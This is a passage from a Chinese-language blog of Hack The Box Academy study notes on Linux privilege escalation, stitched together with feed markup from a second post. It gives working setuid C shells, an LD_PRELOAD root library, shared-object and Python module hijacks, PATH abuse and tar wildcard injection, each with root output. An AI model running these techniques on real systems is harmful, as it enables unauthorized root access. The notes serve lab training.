shell.c #include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(void)&#123;  setuid(0); setgid(0); system(&quot;/bin/bash&quot;);&#125;</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ gcc shell.c -o shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mntroot@Pwnbox:~$ cp shell /mntroot@Pwnbox:~$ chmod u+s /mnt/shell</code></pre><pre><code class="shell-session">htb@NIX02:/tmp$ ./shellroot@NIX02:/tmp# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)</code></pre><h2 id="Hijacking-Tmux-Sessions"><a href="#Hijacking-Tmux-Sessions" class="headerlink" title="Hijacking Tmux Sessions"></a>Hijacking Tmux Sessions</h2><p>诸如 <a href="https://en.wikipedia.org/wiki/Tmux">tmux</a>之类的终端多路复用器可以用于允许在单个控制台会话内访问多个终端会话。当不在tmux窗口中工作时，我们可以从会话分离，仍然保持它处于活动状态（即，运行nmap扫描）。由于许多原因，用户可能会让tmux进程以特权用户的身份运行，例如使用弱权限设置的root，并可能被劫持。这可以通过以下命令来完成，以创建新的共享会话并修改所有权。</p><pre><code class="shell-session">htb@NIX02:~$ tmux -S /shareds new -s debugsesshtb@NIX02:~$ chown root:devs /shareds</code></pre><blockquote><ol><li><p><code>tmux -S /shareds new -s debugsess</code>：这个命令用于创建一个新的 tmux 会话，并将会话的控制 socket（控制 socket 用于与会话通信）设置为 <code>/shareds</code> 目录下的 <code>debugsess</code> 文件。<code>tmux</code> 是一个终端复用工具，允许用户在单个终端窗口中创建多个会话，并在会话之间切换。</p></li><li><p><code>chown root:devs /shareds</code>：这个命令用于更改 <code>/shareds</code> 目录的所有者和所属组。<code>chown</code> 是 Linux 中用于修改文件或目录所有者和所属组的命令。在这里，将 <code>/shareds</code> 目录的所有者设置为 <code>root</code> 用户，所属组设置为 <code>devs</code> 组。</p></li><li><p>设置 <code>/shareds</code> 目录的所属组为 <code>devs</code> 组后，该目录的成员将具有与所有者 <code>root</code> 相同的访问权限。这是因为在 Linux 系统中，文件和目录的权限由三种身份来控制：所有者、所属组和其他用户。</p><p>在这种设置下，<code>root</code> 用户是 <code>/shareds</code> 目录的所有者，而 <code>devs</code> 组是该目录的所属组。Linux 文件系统中的文件和目录权限分为读取（r）、写入（w）和执行（x）权限，可以针对所有者、所属组和其他用户分别设置。</p><p>由于 <code>root</code> 是 <code>/shareds</code> 目录的所有者，因此 <code>root</code> 用户将拥有所有权限，即读取、写入和执行权限。</p><p>同时，由于 <code>devs</code> 组是 <code>/shareds</code> 目录的所属组，并且设置了 <code>chown root:devs /shareds</code>，因此 <code>devs</code> 组的成员将拥有与所有者 <code>root</code> 相同的权限。这意味着 <code>devs</code> 组的成员可以读取、写入和执行 <code>/shareds</code> 目录及其内部的文件。</p></li></ol></blockquote><p>如果我们可以危害dev组中的用户，我们可以连接到此会话并获得root访问权限。 检查是否有任何正在运行的tmux进程。</p><pre><code class="shell-session">htb@NIX02:~$  ps aux | grep tmuxroot      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess</code></pre><p>确认权限。</p><pre><code class="shell-session">htb@NIX02:~$ ls -la /shareds srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds</code></pre><pre><code class="shell-session">htb@NIX02:~$ iduid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)</code></pre><pre><code class="shell-session">htb@NIX02:~$ tmux -S /sharedsiduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Shared-Libraries"><a href="#Shared-Libraries" class="headerlink" title="Shared Libraries"></a>Shared Libraries</h1><p>Linux程序通常使用动态链接的共享对象库。库包含已编译的代码或其他数据，开发人员使用这些数据来避免在多个程序中重写相同的代码。Linux中存在两种类型的库：静态库（用.a文件扩展名表示）和动态链接的共享对象库（用.so文件扩展名指示）。编译程序时，静态库将成为程序的一部分，并且不能更改。但是，可以修改动态库来控制调用它们的程序的执行。 有多种方法可以指定动态库的位置，因此系统将知道在程序执行时在哪里查找它们。这包括编译程序时的-rpath或-rpath链接标志，使用环境变量LD_RUN_PATH或LD_LIBRARY_PATH，将库放置在&#x2F;lib或&#x2F;usr&#x2F;lib默认目录中，或在&#x2F;etc&#x2F;LD.so.conf配置文件中指定另一个包含库的目录。 此外，LD_PRELOAD环境变量可以在执行二进制文件之前加载库。该库中的函数优先于默认函数。二进制文件所需的共享对象可以使用ldd实用程序查看。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd /bin/ls    linux-vdso.so.1 =&gt;  (0x00007fff03bc7000)    libselinux.so.1 =&gt; /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)    libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)    libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)    libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)    /lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)    libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)</code></pre><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdlib.h&gt;void _init() &#123;unsetenv(&quot;LD_PRELOAD&quot;);setgid(0);setuid(0);system(&quot;/bin/bash&quot;);&#125;</code></pre><p>我们可以将其编译如下：</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles</code></pre><blockquote><ol><li><code>gcc</code>: GCC（GNU Compiler Collection）是一个流行的编译器套件，用于编译 C、C++ 等编程语言的源代码。</li><li><code>-fPIC</code>: 这个选项告诉编译器生成位置无关代码（Position Independent Code，PIC），这样编译的共享库可以在内存中的任意位置加载，有助于共享库在不同进程之间共享代码段。</li><li><code>-shared</code>: 这个选项告诉编译器生成共享库而不是可执行文件。</li><li><code>-o root.so</code>: 这个选项指定输出的文件名为 <code>root.so</code>，即编译生成的共享库的文件名。</li><li><code>root.c</code>: 这是输入的源代码文件名，这里假设 <code>root.c</code> 是包含共享库的 C 代码文件。</li><li><code>-nostartfiles</code>: 这个选项告诉编译器不使用标准启动文件，通常用于生成不依赖标准 C 库的共享库。</li></ol></blockquote><p>最后，我们可以使用以下命令升级权限。请确保指定恶意库文件的完整路径。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so 【Privilege command】iduid=0(root) gid=0(root) groups=0(root)</code></pre><p>补充一下：</p><blockquote><p>查看系统中是否有命令使用了 <code>LD_PRELOAD</code> 可能比较复杂，因为 <code>LD_PRELOAD</code> 是一个环境变量，可以在各种脚本、配置文件或命令中设置，甚至在程序运行时通过 <code>dlopen()</code> 等函数动态加载共享库。</p><p>以下是一些可能使用 <code>LD_PRELOAD</code> 的常见命令或程序：</p><ol><li><p><code>ldd</code>: <code>ldd</code> 命令本身会使用 <code>LD_PRELOAD</code> 来查找程序所依赖的共享库。</p></li><li><p>动态链接的程序：那些使用动态链接的程序，如自己编写的程序、第三方程序或系统工具，可能在启动时使用了 <code>LD_PRELOAD</code> 来预加载共享库。</p></li><li><p>启动脚本或配置文件：有些应用程序的启动脚本或配置文件中可能设置了 <code>LD_PRELOAD</code> 环境变量。</p></li><li><p>调试工具：一些调试工具可能使用 <code>LD_PRELOAD</code> 来注入共享库，从而实现调试目标程序。</p></li><li><p>系统设置：在某些情况下，系统级别的设置或安全策略可能设置了全局的 <code>LD_PRELOAD</code>，从而影响所有程序的运行。</p></li></ol><p>要查找系统中所有使用了 <code>LD_PRELOAD</code> 的命令，您可以使用以下方法：</p><ol><li><p>使用 <code>grep</code> 命令：在系统目录和用户目录中查找包含 <code>LD_PRELOAD</code> 的文件。例如：</p><pre><code class="bash">grep -rnw &#39;/&#39; -e &quot;LD_PRELOAD&quot;</code></pre><p>这会在整个系统中递归地查找包含 <code>LD_PRELOAD</code> 的文件，并列出相应的行和文件名。</p></li><li><p>使用 <code>ps</code> 命令：查看当前正在运行的进程中是否有使用了 <code>LD_PRELOAD</code> 的程序。例如：</p><pre><code class="bash">ps -eo pid,args | grep &quot;LD_PRELOAD&quot;</code></pre><p>这会列出当前正在运行的进程中包含 <code>LD_PRELOAD</code> 的命令行。</p></li></ol><p>请注意，找到使用 <code>LD_PRELOAD</code> 的命令并不意味着它们一定是恶意的或具有安全风险的。某些合法的程序可能需要使用 <code>LD_PRELOAD</code> 来实现特定功能或调试需求。然而，在生产环境中，对于未知来源或未经验证的 <code>LD_PRELOAD</code> 设置需要谨慎处理，以确保系统安全。</p></blockquote><h1 id="Shared-Object-Hijacking"><a href="#Shared-Object-Hijacking" class="headerlink" title="Shared Object Hijacking"></a>Shared Object Hijacking</h1><p>正在开发的程序和二进制文件通常具有与其相关联的自定义库。请考虑以下SETUID二进制文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la payroll-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll</code></pre><p>我们可以使用ldd来打印二进制或共享对象所需的共享对象。对于程序的每个依赖项，Ldd显示对象的位置和加载到内存中的十六进制地址。</p><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 =&gt;  (0x00007ffcb3133000)libshared.so =&gt; /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)</code></pre><p>我们看到一个名为libshared.so的非标准库被列为二进制文件的依赖项。如前所述，可以从自定义位置加载共享库。一个这样的设置是RUNPATH配置。此文件夹中的库优先于其他文件夹。这可以使用<a href="https://man7.org/linux/man-pages/man1/readelf.1.html">readelf</a> 实用程序进行检查。</p><pre><code class="shell-session">htb_student@NIX02:~$ readelf -d payroll  | grep PATH 0x000000000000001d (RUNPATH)            Library runpath: [/development]</code></pre><p>该配置允许从&#x2F;development文件夹加载库，该文件夹可由所有用户写入。此错误配置可通过在&#x2F;development中放置恶意库来利用，该库将优先于其他文件夹，因为首先检查此文件中的条目（在配置文件中存在其他文件夹之前）。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -la /development/total 8drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../</code></pre><p>在编译库之前，我们需要找到二进制调用的函数名。</p><pre><code class="shell-session">htb_student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ldd payrolllinux-vdso.so.1 (0x00007ffd22bbc000)libshared.so =&gt; /development/libshared.so (0x00007f0c13112000)/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery</code></pre><p>我们可以将现有库复制到开发文件夹中。对二进制文件运行ldd会将库的路径列为&#x2F;development&#x2F;libshared.so，这意味着它很容易受到攻击。执行二进制文件会引发一个错误，说明它找不到名为dbquery的函数。我们可以编译一个包含此函数的共享对象。</p><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;void dbquery() &#123;    printf(&quot;Malicious library loaded\n&quot;);    setuid(0);    system(&quot;/bin/sh -p&quot;);&#125; </code></pre><p>dbquery函数将我们的用户id设置为0（root），并在调用时执行&#x2F;bin&#x2F;sh。使用GCC进行编译。</p><pre><code class="shell-session">htb_student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ ./payroll ***************Inlane Freight Employee Database***************Malicious library loaded# iduid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)</code></pre><h1 id="Python-Library-Hijacking"><a href="#Python-Library-Hijacking" class="headerlink" title="Python Library Hijacking"></a>Python Library Hijacking</h1><p>我们可以通过多种方式劫持Python库。这在很大程度上取决于剧本及其内容本身。但是，有三个基本漏洞可以用来进行劫持： </p><ul><li>写入权限错误 </li><li>库路径 </li><li>PYTHONPATH环境变量</li></ul><h2 id="Wrong-Write-Permissions"><a href="#Wrong-Write-Permissions" class="headerlink" title="Wrong Write Permissions"></a>Wrong Write Permissions</h2><p>例如，我们可以想象我们在公司内部网上的一个开发人员的主机上，而开发人员正在使用python。所以我们总共有三个组件是相连的。这是导入python模块的实际python脚本、脚本的权限以及模块的权限。 一个或另一个python模块可能错误地为所有用户设置了写入权限。这允许对python模块进行编辑和操作，以便我们可以插入将产生我们想要的结果的命令或函数。如果SUID&#x2F;SGID权限已分配给导入此模块的Python脚本，我们的代码将自动包含在内。 如果我们查看mem_stats.py脚本的设置权限，我们可以看到它有一个SUID集。</p><pre><code class="shell-session">htb-student@lpenix:~$ ls -l mem_stats.py-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_stats.py</code></pre><p>因此，我们可以使用另一个用户（在我们的案例中，作为root用户）的权限来执行此脚本。我们还拥有查看脚本和阅读其内容的权限。</p><h4 id="Python-Script-Contents"><a href="#Python-Script-Contents" class="headerlink" title="Python Script - Contents"></a>Python Script - Contents</h4><pre><code class="python">#!/usr/bin/env python3import psutilavailable_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalprint(f&quot;Available memory: &#123;round(available_memory, 2)&#125;%&quot;)</code></pre><p>所以这个脚本非常简单，只显示可用虚拟内存的百分比。我们还可以在第二行中看到，该脚本导入模块psutil并使用函数virtual_memory（）。 因此，我们可以在psutil的文件夹中查找此函数，并检查此模块是否具有写入权限。 </p><h4 id="Module-Permissions"><a href="#Module-Permissions" class="headerlink" title="Module Permissions"></a>Module Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ grep -r &quot;def virtual_memory&quot; /usr/local/lib/python3.8/dist-packages/psutil/*/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py</code></pre><p>这种权限在许多开发人员使用不同脚本的开发人员环境中最为常见，并且可能需要更高的权限。</p><h4 id="Module-Contents"><a href="#Module-Contents" class="headerlink" title="Module Contents"></a>Module Contents</h4><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><p>这是库中我们可以插入代码的部分。建议将其放在函数的开头。在那里，我们可以插入我们认为正确和有效的一切。我们可以出于测试目的导入模块操作系统，这使我们能够执行系统命令。这样，我们就可以插入命令id，并在脚本执行期间检查插入的代码是否执行。</p><pre><code class="python">...SNIP...def virtual_memory():    ...SNIP...    #### Hijacking    import os    os.system(&#39;id&#39;)        global _TOTAL_PHYMEM    ret = _psplatform.virtual_memory()    # cached for later use in Process.memory_percent()    _TOTAL_PHYMEM = ret.total    return ret...SNIP...</code></pre><h4 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.pyuid=0(root) gid=0(root) groups=0(root)uid=0(root) gid=0(root) groups=0(root)Available memory: 79.22%</code></pre><p>成功正如我们从上面的结果中看到的那样，我们成功地劫持了库，并使virtual_memory（）函数中的代码以root身份运行。现在我们已经得到了所需的结果，我们可以再次编辑库，但这一次，插入一个以root身份连接到主机的反向shell。</p><h2 id="Library-Path"><a href="#Library-Path" class="headerlink" title="Library Path"></a>Library Path</h2><p>在Python中，每个版本都有指定的搜索和导入库（模块）的顺序。Python从中导入模块的顺序基于优先级系统，这意味着列表中较高的路径优先于列表中较低的路径。我们可以通过发出以下命令来看到这一点：</p><pre><code class="shell-session">htb-student@lpenix:~$ python3 -c &#39;import sys; print(&quot;\n&quot;.join(sys.path))&#39;/usr/lib/python38.zip/usr/lib/python3.8/usr/lib/python3.8/lib-dynload/usr/local/lib/python3.8/dist-packages/usr/lib/python3/dist-packages</code></pre><p>为了能够使用这个变体，两个先决条件是必要的。 脚本导入的模块位于通过PYTHONPATH变量列出的一个优先级较低的路径下。 我们必须对列表中优先级较高的路径之一具有写入权限。</p><p>因此，如果导入的模块位于列表中较低的路径中，并且较高优先级的路径可由我们的用户编辑，我们可以自己创建一个具有相同名称的模块，并包含我们自己想要的功能。由于优先级较高的路径会更早读取并检查有问题的模块，因此Python会访问它找到的第一个命中，并在到达原始和预期模块之前将其导入。 为了让这一点更有意义，让我们继续前面的例子，并展示如何利用这一点。以前，psutil模块被导入到mem_stats.py脚本中。我们可以通过发出以下命令来查看psutil的默认安装位置：</p><h4 id="Psutil-Default-Installation-Location"><a href="#Psutil-Default-Installation-Location" class="headerlink" title="Psutil Default Installation Location"></a>Psutil Default Installation Location</h4><pre><code class="shell-session">htb-student@lpenix:~$ pip3 show psutil...SNIP...Location: /usr/local/lib/python3.8/dist-packages...SNIP...</code></pre><p>从这个例子中，我们可以看到psutil安装在以下路径中：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;dist-packages。从我们之前列出的PYTHONPATH变量中，我们有合理数量的目录可供选择，以查看环境中是否存在任何错误配置，从而允许我们对其中任何目录进行写访问。让我们检查一下。</p><h4 id="Misconfigured-Directory-Permissions"><a href="#Misconfigured-Directory-Permissions" class="headerlink" title="Misconfigured Directory Permissions"></a>Misconfigured Directory Permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ ls -la /usr/lib/python3.8total 4916drwxr-xrwx 30 root root  20480 Dec 14 16:26 ....SNIP...</code></pre><p>在检查了列出的所有目录后，&#x2F;usr&#x2F;lib&#x2F;python3.8路径的配置似乎不正确，任何用户都可以对其进行写入。通过与PYTHONPATH变量中的值进行交叉检查，我们可以看到该路径在列表中的位置高于安装psutil的路径。让我们尝试滥用这种错误配置，在&#x2F;usr&#x2F;lib&#x2F;python3.8目录中创建我们自己的psutil模块，该模块包含我们自己的恶意virtual_memory（）函数。</p><h4 id="Hijacked-Module-Contents-psutil-py"><a href="#Hijacked-Module-Contents-psutil-py" class="headerlink" title="Hijacked Module Contents - psutil.py"></a>Hijacked Module Contents - psutil.py</h4><pre><code class="python">#!/usr/bin/env python3import osdef virtual_memory():    os.system(&#39;id&#39;)</code></pre><p>为了达到这一点，我们需要创建一个名为psutil.py的文件，该文件包含前面提到的目录中列出的内容。非常重要的是，我们要确保我们创建的模块与导入具有相同的名称，并且具有与我们打算劫持的函数相同的函数，并向其传递正确数量的参数。这一点至关重要，因为如果这两种情况都不成立，我们将无法进行这次攻击。在创建了包含上一个劫持脚本示例的文件之后，我们已经成功地为利用该系统做好了准备。 让我们再次像前面的例子一样使用sudo运行mem_status.py脚本。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo /usr/bin/python3 mem_stats.pyuid=0(root) gid=0(root) groups=0(root)Traceback (most recent call last):  File &quot;mem_stats.py&quot;, line 4, in &lt;module&gt;    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().totalAttributeError: &#39;NoneType&#39; object has no attribute &#39;available&#39; </code></pre><h2 id="PYTHONPATH-Environment-Variable"><a href="#PYTHONPATH-Environment-Variable" class="headerlink" title="PYTHONPATH Environment Variable"></a>PYTHONPATH Environment Variable</h2><p>在上一节中，我们谈到了术语PYTHONPATH，但是，并没有完全解释它的使用和关于Python功能的重要性。PYTHONPATH是一个环境变量，指示Python可以搜索要导入的模块的目录。这一点很重要，因为如果允许用户在运行python二进制文件时操作和设置此变量，那么在导入模块时，他们可以有效地将python的搜索功能重定向到用户定义的位置。我们可以通过检查我们的sudo权限来查看我们是否有权限为python二进制文件设置环境变量：</p><h4 id="Checking-sudo-permissions"><a href="#Checking-sudo-permissions" class="headerlink" title="Checking sudo permissions"></a>Checking sudo permissions</h4><pre><code class="shell-session">htb-student@lpenix:~$ sudo -l Matching Defaults entries for htb-student on ACADEMY-LPENIX:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser htb-student may run the following commands on ACADEMY-LPENIX:    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3</code></pre><p>正如我们从示例中看到的那样，我们可以在sudo的可信权限下运行&#x2F;usr&#x2F;bin&#x2F;python3，因此可以通过设置SETENV:标志来设置环境变量，以便与该二进制文件一起使用。值得注意的是，由于sudo的可信性质，在调用二进制文件之前定义的任何环境变量都不受任何关于能够在系统上设置环境变量的限制。这意味着使用&#x2F;usr&#x2F;bin&#x2F;python3二进制文件，我们可以在运行程序的上下文中有效地设置任何环境变量。现在让我们使用上一节中的psutil.py脚本来尝试这样做。</p><pre><code class="shell-session">htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_stats.pyuid=0(root) gid=0(root) groups=0(root)...SNIP...</code></pre><p>在本例中，我们将上一个python脚本从&#x2F;usr&#x2F;lib&#x2F;python3.8目录移动到&#x2F;tmp。从这里开始，我们再次调用&#x2F;usr&#x2F;bin&#x2F;python3来运行mem_stats.py，但是，我们指定PYTHONPATH变量包含&#x2F;tmp目录，以便它强制Python搜索该目录以查找要导入的psutil模块。正如我们所看到的，我们再次成功地在root上下文下运行了我们的脚本。</p><h1 id="Skills-Assessment"><a href="#Skills-Assessment" class="headerlink" title="Skills Assessment"></a>Skills Assessment</h1><blockquote><p>我们已签约对INLANEFREIGHT组织的一个面向公众的网络服务器进行安全强化评估。 客户端为我们提供了一个低特权用户来评估服务器的安全性。通过SSH连接，并使用本模块中学到的技能开始查找可能会提升权限的错误配置和其他缺陷。 一旦进入主机，我们必须在主机上找到五个标志，这些标志可以在不同的权限级别访问。将权限从htb学生用户一直提升到根用户，并提交所有五个标志来完成本模块。 注意：如果您想让场景更具挑战性，有一种方法可以在盒子上获得shell，而不是使用SSH凭据。这是可选的，不会奖励更多的分数或计入完成。</p></blockquote><p>根据提示所说，目测他应该有一个网站，简单扫描了一下，它使用了wordpress5.5.1，搜索了一下有一些漏洞，然后在8080端口有一个webadmin链接，需要登陆，这里简单探索了一下，先不深究。</p><p>这里通过信息搜集发现在系统内核版本和sudo版本都存在漏洞，但是主机不允许跟github通信，通过其他方法把exp脚本传过去，我这里使用的是本机搭建一个服务器，然后：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181333205.png" alt="image-20230718133304072"></p><p>很奇怪，第一个flag找不到？这里先用新学到的方法一次性读取一下找到的flag：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181335994.png" alt="image-20230718133545934"></p><p>查看了一下他给的提示，让彻底枚举整个目录，猜想可能是隐藏文件，果然：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307181342618.png" alt="image-20230718134212561"></p><p>这里根据他给出的路径顺序其实也暗示了我们平时可能拿到敏感信息的地方：</p><p>当前用户目录下的隐藏文件，就拿这道题来说还是能从用户目录下读到不少敏感信息</p><pre><code>htb-student@nix03:~$ ls -altotal 36drwxr-xr-x 4 htb-student htb-student 4096 Jul 18 05:08 .drwxr-xr-x 5 root        root        4096 Sep  6  2020 ..-rw------- 1 htb-student htb-student   57 Sep  6  2020 .bash_history-rw-r--r-- 1 htb-student htb-student  220 Feb 25  2020 .bash_logout-rw-r--r-- 1 htb-student htb-student 3771 Feb 25  2020 .bashrcdrwx------ 2 htb-student htb-student 4096 Sep  6  2020 .cachedrwxr-xr-x 2 root        root        4096 Sep  6  2020 .config-rw-r--r-- 1 htb-student htb-student  807 Feb 25  2020 .profile-rw------- 1 htb-student htb-student  676 Jul 18 05:08 .viminfo</code></pre><p>然后就是&#x2F;home路径下其他的用户文件、&#x2F;log系统日志文件、&#x2F;…&#x2F;tomcat9&#x2F;系统启动的服务器目录 、&#x2F;root即管理员目录等</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Containers&quot;&gt;&lt;a href=&quot;#Containers&quot; class=&quot;headerlink&quot; title=&quot;Containers&quot;&gt;&lt;/a&gt;Containers&lt;/h1&gt;&lt;p&gt;容器在操作系统级别操作，虚拟机在硬件级别操作。因此，容器共享一个操作系统，并将应用程序进程与系统的其他部分隔离开来，而经典的虚拟化允许多个操作系统在单个系统上同时运行。 隔离和虚拟化至关重要，因为它们有助于尽可能高效地管理资源和安全方面。例如，它们有助于监测系统中的错误，这些错误通常与新开发的应用程序无关。另一个例子是隔离通常需要root权限的进程。此类应用程序可以是web应用程序或API，必须与主机系统隔离，以防止升级到数据库。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux-Privilege-Escalation2</title>
    <link href="https://taninluv.github.io/2023/07/16/Linux-Privilege-Escalation2/"/>
    <id>https://taninluv.github.io/2023/07/16/Linux-Privilege-Escalation2/</id>
    <published>2023-07-16T01:42:18.000Z</published>
    <updated>2023-07-18T11:28:13.059Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Path-Abuse"><a href="#Path-Abuse" class="headerlink" title="Path Abuse"></a>Path Abuse</h1><p>如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&#x2F;bin&#x2F;ls的二进制文件）。</p><span id="more"></span><pre><code class="shell-session">htb_student@NIX02:~$ PATH=.:$&#123;PATH&#125;htb_student@NIX02:~$ export PATHhtb_student@NIX02:~$ echo $PATH.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games</code></pre><p>在本例中，我们修改路径，以便在键入ls命令时运行一个简单的echo命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ touch lshtb_student@NIX02:~$ echo &#39;echo &quot;PATH ABUSE!!&quot;&#39; &gt; lshtb_student@NIX02:~$ chmod +x ls</code></pre><pre><code class="shell-session">htb_student@NIX02:~$ lsPATH ABUSE!!</code></pre><h1 id="Wildcard-Abuse"><a href="#Wildcard-Abuse" class="headerlink" title="Wildcard Abuse"></a>Wildcard Abuse</h1><p>滥用通配符</p><p>通配符可以用作其他字符的替换，并在执行其他操作之前由shell进行解释。通配符的示例包括：</p><table><thead><tr><th><strong>字符</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td><code>*</code></td><td>可以匹配文件名中任意数量的字符的星号。</td></tr><tr><td><code>?</code></td><td>匹配单个字符。</td></tr><tr><td><code>[ ]</code></td><td>方括号将字符括起来，并且可以匹配定义位置的任何一个字符。</td></tr><tr><td><code>~</code></td><td>开头的波浪号扩展为用户主目录的名称，也可以附加另一个用户名以引用该用户的主目录。</td></tr><tr><td><code>-</code></td><td>括号内的连字符表示字符范围。</td></tr></tbody></table><p>tar命令是一个如何滥用通配符进行权限提升的示例，它是一个用于创建&#x2F;提取归档的通用程序。如果我们查看tar命令的手册页，我们会看到以下内容：</p><pre><code class="shell-session">htb_student@NIX02:~$ man tar&lt;SNIP&gt;Informative output       --checkpoint[=N]              Display progress messages every Nth record (default 10).       --checkpoint-action=ACTION              Run ACTION on each checkpoint.</code></pre><p>–checkpoint操作选项允许在到达检查点时执行EXEC操作（即，在执行tar命令后运行任意操作系统命令。）通过使用这些名称创建文件，当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh将作为命令行选项传递给tar。让我们在实践中看到这一点。 考虑下面的cron作业，它被设置为备份&#x2F;root目录的内容，并在&#x2F;tmp中创建一个压缩的归档文件。cron作业被设置为每分钟运行一次，因此它是特权提升的一个很好的候选者。</p><blockquote><p>&#x3D;&#x3D;当指定通配符时，–checkpoint&#x3D;1和–checkpoint action&#x3D;EXEC&#x3D;sh root.sh&#x3D;&#x3D;这句话相当于手动设置ACTION为sh root.sh</p></blockquote><pre><code class="shell-session">##mh dom mon dow command*/01 * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这里补充一些chatgpt：</p><blockquote><p>这个命令看起来像是一个 cron 表达式，用于设置定时任务。在 cron 表达式中，有 5 个字段，它们分别表示：</p><ol><li><code>m</code>：分钟（0-59）</li><li><code>h</code>：小时（0-23）</li><li><code>dom</code>：月份中的某一天（1-31）</li><li><code>mon</code>：月份（1-12）</li><li><code>dow</code>：星期中的某一天（0-7，其中 0 和 7 都表示星期日）</li></ol><p>每个字段可以是一个具体的数字，也可以是一个范围或者一个列表。例如，<code>*</code> 